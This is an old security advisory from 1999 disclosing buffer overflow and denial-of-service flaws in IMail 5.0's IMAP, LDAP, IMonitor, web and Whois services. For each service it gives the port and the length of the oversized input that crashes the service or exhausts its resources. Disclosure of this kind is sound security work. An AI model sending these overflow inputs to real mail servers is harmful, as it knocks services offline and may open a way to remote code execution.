Multiple IMail Vulnerabilites

Systems Affected
IMail 5.0

Release Date
March 1, 1999

Advisory Code
AD03011999

________________________________________________________________________

Description:
________________________________________________________________________

The following holes can be used as a Denial of Service against the
various services mentioned and in some cases used to remotely execute
code.

---> Imapd (143)

The imapd login process does not do proper bounds checking on usernames
and passwords.

* OK IMAP4 Server (IMail 4.06)
X LOGIN glob1 glob2

Where glob1 is 1200 characters and glob2 is 1300 characters. The imapd
service will crash with the usuall overflow error.

---> LDAP (389)

Telnet to server.com 389
Send: Y glob1
hit enter twice
Server Returns: 0
Send: Y glob2
hit enter

Where glob1 and glob2 are 2375 characters and Y is Y. The ldap service
goes to 90 percent or so and idles there. Therefore using up most
system resources.

---> IMonitor (8181)

Telnet to server.com 8181
Send: glob1
hit enter twice

Where glob1 is 2045 characters. The IMonitor service crashes with the
normal overflow message.

---> IMail Web Service (8383)

Telnet to server.com 8383
Send: GET /glob1/

Where glob1 is 3000 characters. The usual overflow message will be
displayed. This one looks to be easily exploitable. >:-]

---> Whois32 Daemon (43)

Telnet to server.com 43
Send glob1

Where glob1 is 1000 characters. The usual overflow message will be
displayed. Ya... starting to sound old.
